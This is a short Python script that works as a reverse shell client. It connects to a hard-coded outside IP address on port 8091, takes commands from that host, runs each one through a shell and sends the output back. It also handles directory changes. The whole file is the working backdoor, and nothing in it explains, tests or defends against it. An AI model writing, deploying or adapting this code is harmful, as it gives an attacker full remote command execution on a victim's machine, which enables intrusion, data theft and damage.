import socket
from queue import Queue
import os
import subprocess

socket = socket.socket()

HOST = "35.184.234.161"
PORT = 8091

socket.connect((HOST,PORT))


while True:
    DATA = socket.recv(1024)
    if DATA[:2].decode("utf-8") == "cd":
        os.chdir(DATA[3:].decode("utf-8"))

    if len(DATA) > 0:
        CMD = subprocess.Popen(DATA[:].decode("utf-8"),shell=True , stdout = subprocess.PIPE,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
        output_byte = CMD.stdout.read() + CMD.stderr.read()
        output_str = str(output_byte,"utf-8")
        CWD = os.getcwd() + "> "

        socket.send(str.encode(output_str + CWD))



